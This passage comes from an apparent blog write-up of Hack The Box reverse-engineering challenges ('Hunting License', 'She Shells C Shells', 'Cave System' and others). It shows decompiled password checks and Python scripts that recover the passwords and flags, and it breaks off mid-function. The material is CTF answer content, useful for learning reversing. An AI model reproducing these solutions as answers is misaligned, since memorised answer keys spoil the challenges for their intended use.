class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Needle-in-a-Haystack"><a href="#Needle-in-a-Haystack" class="headerlink" title="Needle in a Haystack"></a>Needle in a Haystack</h2><p>like name like challenge - flag in a file, running strings command on file </p><p><img src="/imgs/post3/rev/haystack.png" alt="haystack"></p><h2 id="Hunting-License"><a href="#Hunting-License" class="headerlink" title="Hunting License"></a>Hunting License</h2><p>running the binary </p><p><img src="/imgs/post3/rev/hunting_lic1.png" alt="hunting_lic1"></p><p>asking for the first password that says not even hidden lets check it using strigns command </p><p><img src="/imgs/post3/rev/hunting_lic2.png" alt="hunting_lic2"></p><p>we got first pass feeding this as first password </p><p><img src="/imgs/post3/rev/hunting_lic3.png" alt="hunting_lic3.png"></p><p>now for second password, entering some promising string while strings command didn’t work</p><p>examining the <code>exam</code> function inside the main function</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">exam</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  undefined8 local_38;</span><br><span class="line">  undefined8 local_30;</span><br><span class="line">  undefined local_28;</span><br><span class="line">  undefined8 local_1c;</span><br><span class="line">  undefined4 local_14;</span><br><span class="line">  <span class="type">char</span> *local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = (<span class="type">char</span> *)readline(</span><br><span class="line">                             <span class="string">&quot;Okay, first, a warmup - what\&#x27;s the first password? This one\&#x27;s not even hidden: &quot;</span></span><br><span class="line">                             );</span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>(local_10,<span class="string">&quot;PasswordNumeroUno&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Not even close!&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(local_10);</span><br><span class="line">  local_1c = <span class="number">0</span>;</span><br><span class="line">  local_14 = <span class="number">0</span>;</span><br><span class="line">  reverse(&amp;local_1c,t,<span class="number">0xb</span>);</span><br><span class="line">  local_10 = (<span class="type">char</span> *)readline(<span class="string">&quot;Getting harder - what\&#x27;s the second password? &quot;</span>);</span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>(local_10,(<span class="type">char</span> *)&amp;local_1c);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You\&#x27;ve got it all backwards...&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(local_10);</span><br><span class="line">  local_38 = <span class="number">0</span>;</span><br><span class="line">  local_30 = <span class="number">0</span>;</span><br><span class="line">  local_28 = <span class="number">0</span>;</span><br><span class="line">  xor(&amp;local_38,t2,<span class="number">0x11</span>,<span class="number">0x13</span>);</span><br><span class="line">  local_10 = (<span class="type">char</span> *)readline(<span class="string">&quot;Your final test - give me the third, and most protected, password: &quot;</span>)</span><br><span class="line">  ;</span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>(local_10,(<span class="type">char</span> *)&amp;local_38);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Failed at the final hurdle!&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(local_10);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>so basically we are asked for three password first is already visible to us and have also got from strings command.</p><p>and in case of second password check first <code>reverse</code> function is called and then result&#x2F;return value i.e local_1c of that function is being compared to user input i.e. local_10 </p><p>reverse func:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">reverse</span><span class="params">(<span class="type">long</span> res,<span class="type">long</span> unknown_value,ulong length)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; (ulong)(<span class="type">long</span>)i &lt; length; i = i + <span class="number">1</span>) &#123;</span><br><span class="line">    *(undefined *)(res + i) = *(undefined *)(unknown_value + (length - (<span class="type">long</span>)i) + <span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unkown_value being revere and stored to <strong>res</strong> variable, inspecting in radare graph view </p><p><img src="/imgs/post3/rev/hunting_lic4.png" alt="hunting_lic4"></p><p>we can see the unkown_value i.e. ‘0wTdr0wss4P’.</p><p>its time for <code>xor</code> function ,where again local_10 var’s value is being compared to local_38 </p><p>xor function :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">xor</span><span class="params">(<span class="type">long</span> param_1,<span class="type">long</span> param_2,ulong param_3,byte param_4)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> local_c;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (local_c = <span class="number">0</span>; (ulong)(<span class="type">long</span>)local_c &lt; param_3; local_c = local_c + <span class="number">1</span>) &#123;</span><br><span class="line">    *(byte *)(param_1 + local_c) = *(byte *)(param_2 + local_c) ^ param_4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>we need to have param_2 value in order to know the third password as param_4 is being xored to this value and then return back to compare with user input </p><p><img src="/imgs/post3/rev/hunting_lic5.png" alt="hunting_lic5"></p><p>as you can see above radare graph view this value ‘G{zawR}wUz}r\x7f222\x13’ is param_2 </p><h3 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">param_1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">param_2 =  <span class="string">&#x27;G&#123;zawR&#125;wUz&#125;r\x7f222\x13&#x27;</span><span class="comment">#&#x27;G&#123;zawR&#125;wUz&#125;r&#x27;</span></span><br><span class="line">param_3 = <span class="number">0x11</span></span><br><span class="line">param_4 = <span class="number">0x13</span></span><br><span class="line">rev_me = <span class="string">&#x27;0wTdr0wss4P&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">param_1, param_2, param_3, param_4</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(param_3):</span><br><span class="line">        <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(param_2):</span><br><span class="line">            result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(param_2[i]) ^ param_4)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">result = xor(param_1, param_2, param_3, param_4)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nPassword2 : &quot;</span>,rev_me[::-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Password3 : &quot;</span>,result)</span><br></pre></td></tr></table></figure><h2 id="She-Shells-C-Shells"><a href="#She-Shells-C-Shells" class="headerlink" title="She Shells C Shells"></a>She Shells C Shells</h2><p>func_flag:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">undefined8 <span class="title function_">func_flag</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined8 uVar1;</span><br><span class="line">  undefined8 user_input;</span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> local_14;</span><br><span class="line">  uint j;</span><br><span class="line">  uint i;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Password: &quot;</span>);</span><br><span class="line">  user_input = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  fgets((<span class="type">char</span> *)&amp;user_input,<span class="number">0x100</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x4d</span>; i = i + <span class="number">1</span>) &#123;</span><br><span class="line">    *(byte *)((<span class="type">long</span>)&amp;user_input + (<span class="type">long</span>)(<span class="type">int</span>)i) =</span><br><span class="line">         *(byte *)((<span class="type">long</span>)&amp;user_input + (<span class="type">long</span>)(<span class="type">int</span>)i) ^ m1[(<span class="type">int</span>)i];</span><br><span class="line">  &#125;</span><br><span class="line">  local_14 = <span class="built_in">memcmp</span>(&amp;user_input,t,<span class="number">0x4d</span>);</span><br><span class="line">  <span class="keyword">if</span> (local_14 == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">0x4d</span>; j = j + <span class="number">1</span>) &#123;</span><br><span class="line">      *(byte *)((<span class="type">long</span>)&amp;user_input + (<span class="type">long</span>)(<span class="type">int</span>)j) =</span><br><span class="line">           *(byte *)((<span class="type">long</span>)&amp;user_input + (<span class="type">long</span>)(<span class="type">int</span>)j) ^ m2[(<span class="type">int</span>)j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Flag: %s\n&quot;</span>,&amp;user_input);</span><br><span class="line">    uVar1 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    uVar1 = <span class="number">0xffffffff</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uVar1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>memcmp</code> function before second for loop(ignore first) variable “t” being compared to value stored in user_input memory location if so then it being xored with vairable “m2” that makes our flag.</p><p>so we need “t” and “m2” to get the flag, through static analysis we can see the value of both var</p><h3 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">t = <span class="string">b&#x27;\x2c\x4a\xb7\x99\xa3\xe5\x70\x78\x93\x6e\x97\xd9\x47\x6d\x38\xbd\xff\xbb\x85\x99\x6f\xe1\x4a\xab\x74\xc3\x7b\xa8\xb2\x9f\xd7\xec\xeb\xcd\x63\xb2\x39\x23\xe1\x84\x92\x96\x09\xc6\x99\xf2\x58\xfa\xcb\x6f\x6f\x5e\x1f\xbe\x2b\x13\x8e\xa5\xa9\x99\x93\xab\x8f\x70\x1c\xc0\xc4\x3e\xa6\xfe\x93\x35\x90\xc3\xc9\x10\xe9&#x27;</span></span><br><span class="line"></span><br><span class="line">m2 = <span class="string">b&#x27;\x64\x1e\xf5\xe2\xc0\x97\x44\x1b\xf8\x5f\xf9\xbe\x18\x5d\x48\x8e\x91\xe4\xf6\xf1\x5c\x8d\x26\x9e\x2b\xa1\x02\xf7\xc6\xf7\xe4\xb3\x98\xfe\x57\xed\x4a\x4b\xd1\xf6\xa1\xeb\x09\xc6\x99\xf2\x58\xfa\xcb\x6f\x6f\x5e\x1f\xbe\x2b\x13\x8e\xa5\xa9\x99\x93\xab\x8f\x70\x1c\xc0\xc4\x3e\xa6\xfe\x93\x35\x90\xc3\xc9\x10\xe9&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">77</span>):</span><br><span class="line">        <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(t) <span class="keyword">and</span> i &lt; <span class="built_in">len</span>(m2):</span><br><span class="line">                flag += <span class="built_in">chr</span>(t[i]^m2[i])</span><br><span class="line"></span><br><span class="line">flag = re.search(<span class="string">r&#x27;HTB&#123;.*&#125;&#x27;</span>, flag).group(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Cave-System"><a href="#Cave-System" class="headerlink" title="Cave System"></a>Cave System</h2><p>after some hands on angr module and solving Shattered tablet challenge i got some guts and tried to solve this one too</p><details> <summary>main funciton</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  undefined8 local_88;</span><br><span class="line">  undefined8 local_80;</span><br><span class="line">  undefined8 local_78;</span><br><span class="line">  undefined8 local_70;</span><br><span class="line">  undefined8 local_68;</span><br><span class="line">  undefined8 local_60;</span><br><span class="line">  undefined8 local_58;</span><br><span class="line">  undefined8 local_50;</span><br><span class="line">  undefined8 local_48;</span><br><span class="line">  undefined8 local_40;</span><br><span class="line">  undefined8 local_38;</span><br><span class="line">  undefined8 local_30;</span><br><span class="line">  undefined8 local_28;</span><br><span class="line">  undefined8 local_20;</span><br><span class="line">  undefined8 local_18;</span><br><span class="line">  undefined8 local_10;</span><br><span class="line">  </span><br><span class="line">  local_88 = <span class="number">0</span>;</span><br><span class="line">  local_80 = <span class="number">0</span>;</span><br><span class="line">  local_78 = <span class="number">0</span>;</span><br><span class="line">  local_70 = <span class="number">0</span>;</span><br><span class="line">  local_68 = <span class="number">0</span>;</span><br><span class="line">  local_60 = <span class="number">0</span>;</span><br><span class="line">  local_58 = <span class="number">0</span>;</span><br><span class="line">  local_50 = <span class="number">0</span>;</span><br><span class="line">  local_48 = <span class="number">0</span>;</span><br><span class="line">  local_40 = <span class="number">0</span>;</span><br><span class="line">  local_38 = <span class="number">0</span>;</span><br><span class="line">  local_30 = <span class="number">0</span>;</span><br><span class="line">  local_28 = <span class="number">0</span>;</span><br><span class="line">  local_20 = <span class="number">0</span>;</span><br><span class="line">  local_18 = <span class="number">0</span>;</span><br><span class="line">  local_10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What route will you take out of the cave? &quot;</span>);</span><br><span class="line">  fgets((<span class="type">char</span> *)&amp;local_88,<span class="number">0x80</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  iVar1 = <span class="built_in">memcmp</span>(&amp;local_88,&amp;DAT_00402033,<span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> (((((((iVar1 == <span class="number">0</span>) &amp;&amp; ((byte)(local_78._5_1_ * (<span class="type">char</span>)local_58) == <span class="string">&#x27;\x14&#x27;</span>)) &amp;&amp;</span><br><span class="line">         ((byte)((byte)local_68 - local_68._4_1_) == <span class="number">-6</span>)) &amp;&amp;</span><br><span class="line">        (((((((byte)(local_68._5_1_ - local_70._2_1_) == <span class="number">-0x2a</span> &amp;&amp;</span><br><span class="line">             ((byte)((byte)local_78 - (<span class="type">char</span>)local_58) == <span class="string">&#x27;\b&#x27;</span>)) &amp;&amp;</span><br><span class="line">            (((<span class="type">char</span>)(local_58._7_1_ - (<span class="type">char</span>)local_80) == <span class="number">-0x2b</span> &amp;&amp;</span><br><span class="line">             (((byte)(local_70._2_1_ * local_88._7_1_) == <span class="number">-0x13</span> &amp;&amp;</span><br><span class="line">              ((<span class="type">char</span>)(local_88._4_1_ * (<span class="type">char</span>)local_70) == <span class="number">-0x38</span>)))))) &amp;&amp;</span><br><span class="line">           ((local_68._2_1_ ^ local_70._4_1_) == <span class="number">0x55</span>)) &amp;&amp;</span><br><span class="line">          (((((byte)(local_70._6_1_ - local_58._7_1_) == <span class="string">&#x27;4&#x27;</span> &amp;&amp;</span><br><span class="line">             ((byte)(local_50._3_1_ + local_58._2_1_) == <span class="number">-0x71</span>)) &amp;&amp;</span><br><span class="line">            ((byte)(local_60._4_1_ + local_70._3_1_) == <span class="number">-0x2a</span>)) &amp;&amp;</span><br><span class="line">           (((local_78._1_1_ ^ local_80._6_1_) == <span class="number">0x31</span> &amp;&amp;</span><br><span class="line">            ((byte)((byte)local_50 * local_78._4_1_) == <span class="number">-0x54</span>)))))) &amp;&amp;</span><br><span class="line">         (((((byte)(local_50._2_1_ - local_70._2_1_) == <span class="number">-0x3e</span> &amp;&amp;</span><br><span class="line">            (((local_70._2_1_ ^ local_88._6_1_) == <span class="number">0x2f</span> &amp;&amp;</span><br><span class="line">             ((local_80._6_1_ ^ local_68._7_1_) == <span class="number">0x5a</span>)))) &amp;&amp;</span><br><span class="line">           ((local_60._4_1_ ^ local_68._7_1_) == <span class="number">0x40</span>)) &amp;&amp;</span><br><span class="line">          ((((((byte)local_60 == local_70._2_1_ &amp;&amp;</span><br><span class="line">              ((byte)(local_78._7_1_ + local_58._1_1_) == <span class="number">-0x68</span>)) &amp;&amp;</span><br><span class="line">             ((byte)(local_78._7_1_ * local_50._3_1_) == <span class="string">&#x27;h&#x27;</span>)) &amp;&amp;</span><br><span class="line">            (((byte)(local_88._1_1_ - local_70._4_1_) == <span class="number">-0x25</span> &amp;&amp;</span><br><span class="line">             ((byte)((<span class="type">char</span>)local_70 - local_70._5_1_) == <span class="number">-0x2e</span>)))) &amp;&amp;</span><br><span class="line">           (((<span class="type">char</span>)(local_68._6_1_ - (<span class="type">char</span>)local_70) == <span class="string">&#x27;.&#x27;</span> &amp;&amp;</span><br><span class="line">            ((((byte)local_68 ^ local_78._6_1_) == <span class="number">0x1a</span> &amp;&amp;</span><br><span class="line">             ((byte)(local_60._4_1_ * local_88._4_1_) == <span class="number">-0x60</span>)))))))))))) &amp;&amp;</span><br><span class="line">       ((((((byte)(local_68._6_1_ * local_70._3_1_) == <span class="string">&#x27;^&#x27;</span> &amp;&amp;</span><br><span class="line">           ((((byte)(local_80._7_1_ - (byte)local_60) == <span class="number">-0x38</span> &amp;&amp;</span><br><span class="line">             ((local_58._1_1_ ^ local_58._5_1_) == <span class="number">0x56</span>)) &amp;&amp;</span><br><span class="line">            ((local_70._2_1_ ^ local_60._5_1_) == <span class="number">0x2b</span>)))) &amp;&amp;</span><br><span class="line">          ((((((local_58._6_1_ ^ local_80._1_1_) == <span class="number">0x19</span> &amp;&amp;</span><br><span class="line">              ((byte)(local_70._4_1_ - local_60._7_1_) == <span class="string">&#x27;\x1a&#x27;</span>)) &amp;&amp;</span><br><span class="line">             (((byte)(local_58._2_1_ + local_78._3_1_) == <span class="number">-0x5f</span> &amp;&amp;</span><br><span class="line">              (((byte)(local_68._5_1_ + local_50._1_1_) == <span class="string">&#x27;V&#x27;</span> &amp;&amp;</span><br><span class="line">               ((local_70._5_1_ ^ local_78._2_1_) == <span class="number">0x38</span>)))))) &amp;&amp;</span><br><span class="line">            ((local_60._4_1_ ^ local_50._4_1_) == <span class="number">9</span>)) &amp;&amp;</span><br><span class="line">           ((((((<span class="type">char</span>)(local_80._7_1_ * local_68._6_1_) == <span class="string">&#x27;y&#x27;</span> &amp;&amp;</span><br><span class="line">               ((local_68._5_1_ ^ local_70._6_1_) == <span class="number">0x5d</span>)) &amp;&amp;</span><br><span class="line">              ((byte)(local_88._2_1_ * (byte)local_68) == <span class="string">&#x27;\\&#x27;</span>)) &amp;&amp;</span><br><span class="line">             (((byte)(local_80._2_1_ * local_78._2_1_) == <span class="string">&#x27;9&#x27;</span> &amp;&amp; (local_70._5_1_ == local_78._5_1_))</span><br><span class="line">             )) &amp;&amp; (((byte)(local_68._3_1_ * local_78._5_1_) == <span class="string">&#x27;/&#x27;</span> &amp;&amp;</span><br><span class="line">                    (((byte)((<span class="type">char</span>)local_80 * local_68._5_1_) == <span class="number">-0x55</span> &amp;&amp;</span><br><span class="line">                     ((byte)(local_68._7_1_ + local_70._2_1_) == <span class="number">-0x6d</span>)))))))))) &amp;&amp;</span><br><span class="line">         (((((((local_70._2_1_ ^ local_68._2_1_) == <span class="number">0x73</span> &amp;&amp;</span><br><span class="line">              ((((local_78._4_1_ ^ local_70._7_1_) == <span class="number">0x40</span> &amp;&amp;</span><br><span class="line">                ((byte)(local_70._1_1_ + (byte)local_78) == <span class="number">-0x57</span>)) &amp;&amp;</span><br><span class="line">               ((local_68._7_1_ ^ local_50._3_1_) == <span class="number">0x15</span>)))) &amp;&amp;</span><br><span class="line">             ((((byte)((byte)local_88 + local_50._3_1_) == <span class="string">&#x27;i&#x27;</span> &amp;&amp;</span><br><span class="line">               ((byte)(local_68._2_1_ + local_60._6_1_) == <span class="number">-0x5b</span>)) &amp;&amp;</span><br><span class="line">              (((local_70._6_1_ ^ local_58._4_1_) == <span class="number">0x37</span> &amp;&amp;</span><br><span class="line">               (((byte)((byte)local_88 * local_70._4_1_) == <span class="string">&#x27;\b&#x27;</span> &amp;&amp;</span><br><span class="line">                ((byte)(local_68._2_1_ - (byte)local_50) == <span class="number">-0x3b</span>)))))))) &amp;&amp;</span><br><span class="line">            ((byte)(local_78._2_1_ + local_50._4_1_) == <span class="number">-0x1c</span>)) &amp;&amp;</span><br><span class="line">           (((((local_68._3_1_ ^ (byte)local_60) == <span class="number">0x6e</span> &amp;&amp;</span><br><span class="line">              ((byte)((byte)local_50 * (byte)local_78) == <span class="number">-0x54</span>)) &amp;&amp;</span><br><span class="line">             ((byte)(local_58._6_1_ - local_60._7_1_) == <span class="string">&#x27;\r&#x27;</span>)) &amp;&amp;</span><br><span class="line">            ((((byte)(local_70._6_1_ + local_58._7_1_) == <span class="number">-100</span> &amp;&amp;</span><br><span class="line">              ((byte)(local_88._6_1_ + local_68._1_1_) == <span class="number">-0x2c</span>)) &amp;&amp;</span><br><span class="line">             (((byte)(local_88._7_1_ * local_70._5_1_) == <span class="number">-0x13</span> &amp;&amp;</span><br><span class="line">              ((((byte)local_50 ^ local_70._5_1_) == <span class="number">0x38</span> &amp;&amp;</span><br><span class="line">               ((byte)(local_88._1_1_ * local_68._5_1_) == <span class="string">&#x27;d&#x27;</span>)))))))))) &amp;&amp;</span><br><span class="line">          ((((byte)local_50 ^ local_50._2_1_) == <span class="number">0x46</span> &amp;&amp;</span><br><span class="line">           (((((((<span class="type">char</span>)(local_88._2_1_ * local_78._3_1_) == <span class="string">&#x27;&amp;&#x27;</span> 